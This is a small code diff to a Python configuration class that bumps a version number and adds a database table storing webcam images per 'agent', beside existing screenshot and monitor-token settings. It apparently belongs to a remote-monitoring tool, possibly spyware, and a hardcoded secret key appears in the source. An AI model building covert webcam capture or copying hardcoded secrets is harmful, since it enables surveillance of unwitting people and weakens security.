@@ -13,7 +13,7 @@ class Config:
         self.screenshot_folder = "screenshots"
         self.max_content_length = 500 * 1024 * 1024  # 500MB
         self.secret_key = "mQsjJsMfsW43sdzPf9L2Sr78"
-        self.version = "1.5.2"
+        self.version = "1.5.3"
         self.monitor_token = secrets.token_urlsafe(32)  
 
         
@@ -90,7 +90,16 @@ class Config:
                 timestamp TEXT
             )
         ''')
-        
+
+        c.execute('''
+            CREATE TABLE IF NOT EXISTS webcam_captures (
+                id INTEGER PRIMARY KEY,
+                agent_id TEXT,
+                image BLOB,
+                timestamp TEXT
+            )
+        ''')
+
         c.execute('''
             CREATE TABLE IF NOT EXISTS users (
                 id INTEGER PRIMARY KEY,
